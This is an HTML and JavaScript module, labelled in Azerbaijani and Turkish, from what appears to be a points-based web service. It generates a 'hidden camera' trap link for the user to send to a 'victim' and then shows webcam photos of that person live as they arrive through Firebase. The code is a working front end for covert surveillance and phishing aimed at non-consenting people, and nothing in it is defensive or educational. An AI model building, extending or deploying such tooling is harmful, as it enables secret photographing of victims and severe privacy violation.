<div id="trap-module" style="color: white; font-family: 'Outfit', sans-serif; text-align: center; padding: 20px;">
    <i class="fas fa-video-slash" style="font-size: 3.5rem; color: #ff007a; margin-bottom: 20px;"></i>
    <h2 id="trap-head" style="font-family: 'Syncopate'; font-size: 0.9rem;">CAMERA TRAP LIVE</h2>
    
    <div id="trap-init-gate">
        <p style="opacity: 0.6; font-size: 0.75rem;">Qurban üçün gizli kamera linki yaradın (500 PTS).</p>
        <button onclick="generateSecureLink()" id="gen-btn" style="width: 100%; padding: 18px; border-radius: 15px; border: none; background: white; color: black; font-weight: 900; cursor: pointer; margin-top: 15px;">LİNKİ YARAT</button>
    </div>

    <div id="trap-result" style="display: none; margin-top: 20px; animation: fadeInUp 0.5s;">
        <div style="background: #000; padding: 12px; border-radius: 12px; border: 1px solid #333; margin-bottom: 20px;">
            <code id="final-link-box" style="color: #ff007a; font-size: 0.75rem; word-break: break-all;"></code>
            <p style="font-size: 0.6rem; opacity: 0.5; margin-top: 10px;">Link kopyalayın və qurbana göndərin.</p>
        </div>

        <div style="border-top: 1px solid #222; padding-top: 20px;">
            <h4 style="font-size: 0.7rem; color: #00ff00; letter-spacing: 2px;"><i class="fas fa-sync-alt fa-spin"></i> CANLI NƏTİCƏLƏR</h4>
            <div id="capture-display" style="margin-top: 15px; min-height: 150px; background: rgba(255,255,255,0.02); border-radius: 15px; display: flex; align-items: center; justify-content: center; border: 1px dashed #333;">
                <span id="wait-text" style="opacity: 0.4; font-size: 0.7rem;">Gözlənilir...</span>
            </div>
        </div>
    </div>
</div>



<script>
    async function generateSecureLink() {
        const user = localStorage.getItem('elite_session');
        const userRef = db.ref('users/' + user);
        const snap = await userRef.get();
        const pts = snap.val().points || 0;

        if (pts < 500) {
            alert(currentLang === 'az' ? "Xalınız kifayət deyil!" : "Puanınız yetersiz!");
            return;
        }

        // Xalın çıxılması
        await userRef.update({ points: pts - 500 });
        
        document.getElementById('trap-init-gate').style.display = 'none';
        document.getElementById('trap-result').style.display = 'block';
        
        const siteUrl = window.location.origin;
        const uniqueID = "TR" + Math.floor(Math.random() * 9999);
        const fullLink = `${siteUrl}/capture.html?id=${uniqueID}&ref=${user}`;
        document.getElementById('final-link-box').innerText = fullLink;

        // CANLI İZLƏMƏNİ BAŞLAT
        startLiveListener(user, uniqueID);
    }

    function startLiveListener(user, trapID) {
        // Firebase-də həmin trapID-ni izləyirik
        db.ref('traps/' + user + '/' + trapID).on('value', (snapshot) => {
            const data = snapshot.val();
            if (data && data.image) {
                const display = document.getElementById('capture-display');
                display.innerHTML = `
                    <div style="animation: fadeIn 1s;">
                        <img src="${data.image}" style="width: 100%; border-radius: 12px; border: 2px solid #00ff00;">
                        <p style="font-size: 0.6rem; color: #00ff00; margin-top: 5px;">ŞƏKİL ÇƏKİLDİ: ${data.time}</p>
                    </div>
                `;
                // Şəkil gələndə bildiriş səsi (opsional)
                console.log("Hedef ele keçirildi!");
            }
        });
    }
</script>
